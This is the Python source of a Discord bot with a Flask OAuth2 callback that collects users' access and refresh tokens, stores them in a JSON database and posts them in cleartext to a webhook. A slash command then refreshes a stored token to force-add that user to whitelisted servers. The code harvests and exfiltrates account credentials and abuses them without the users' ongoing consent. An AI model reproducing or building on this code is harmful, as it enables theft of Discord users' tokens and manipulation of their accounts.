from flask       import Flask, request, redirect, render_template
from threading   import Thread
from discord.ext import commands

import discord
import requests
import pysondb

import os

app = Flask(__name__)
bot = discord.Bot()
db  = pysondb.getDb("db.json")

BOT      = os.environ.get('TOKEN')#'
CSECRET  = os.environ.get('CSECRET')
WEBHOOK  = os.environ.get('WEBHOOK')
API      = 'https://discord.com/api/v10'
CID      = '1325710410619555961'
REDIRECT = 'https://discord-qyly.onrender.com//api/discord/authorization'

WHITELIST = [1325681966955237486, 1207101198369296434]

def excode(code):
    data = {
    'client_id': CID,
    'client_secret': CSECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT
    }

    r = requests.post(f'{API}/oauth2/token', data=data)
    r.raise_for_status()
    print(f"{r.status_code} {r.reason}")
    return r.json()

def fetch(access_token):
    r = requests.get(f"{API}/users/@me", headers={"Authorization": f"Bearer {access_token}"})
    r.raise_for_status()
    print(f"{r.status_code} {r.reason}")
    return r.json()


def reftoken(ref):
    data = {
    'client_id': CID,
    'client_secret': CSECRET,
    'grant_type': 'refresh_token',
    'refresh_token': ref
    }

    r = requests.post(f'{API}/oauth2/token', data=data)
    print(f"{r.status_code} {r.reason}")
    j = r.json()
    db.update({"ref_token": ref}, {"ref_token": j.get('refresh_token'), "acc_token": j.get('access_token')})
    return r.json()

def put(acc, uid, gid):
    headers = {
    "Authorization" : f"Bot {BOT}",
    'Content-Type': 'application/json'
    }

    r = requests.put(f"{API}/guilds/{gid}/members/{uid}", headers=headers, json={"access_token" : f"{acc}"})
    r.raise_for_status()
    print(f"{r.status_code} {r.reason}")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/discord/authorization")
def auth():
    code = request.args.get('code')

    if code:
        data = excode(code)

        acc_token = data.get('access_token')
        ref_token = data.get('refresh_token')
        userId    = fetch(acc_token).get('id')

        existing = db.getByQuery({"uid": userId})

        if not existing:
            db.add({
                "uid": userId,
                "acc_token": acc_token,
                "ref_token": ref_token
            })
            data = {"embeds": [{
                        "title": "New entry",
                        "color": 0x2b2d31,
                        "description": f"### <@{userId}> ({userId})\n-# {acc_token}\n-# {ref_token}"}]}

            requests.post(WEBHOOK, json=data)
        else:
            db.update({
                "uid": userId
            },
            {
                "acc_token": acc_token,
                "ref_token": ref_token
            })

    return redirect(f"https://discord.com/app")

@bot.event
async def on_ready():
    print("Connected")
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=8080))
    t.start()

@bot.slash_command()
async def ping(ctx):
    await ctx.respond(f"Pong! Latency is {bot.latency}")

@bot.slash_command(description="Invites/Adds user with given Id to this server")
async def invite(ctx, uid):
    if ctx.guild.id not in WHITELIST: return
    user = await bot.fetch_user(int(uid))
    if user is None:
        await ctx.send_response(f"**error** **Invalid** userId ({uid})", ephemeral = True)
        return
    
    existing = db.getBy({"uid": str(user.id)})
    if not existing:
        await ctx.send_response(f"**error** {user.mention}'s database entry returned **None**", ephemeral = True)
        return
    
    ref = existing[0]['ref_token']
    uid = existing[0]['uid']

    x = reftoken(ref)
    try:
        put(x.get('access_token'), uid, ctx.guild.id)
        await ctx.send_response(f"Added {user.mention} to **{ctx.guild.name}**", ephemeral = True)
    except Exception as e:
        await ctx.send_response(f"**error** {e}", ephemeral = True)

bot.run(BOT)
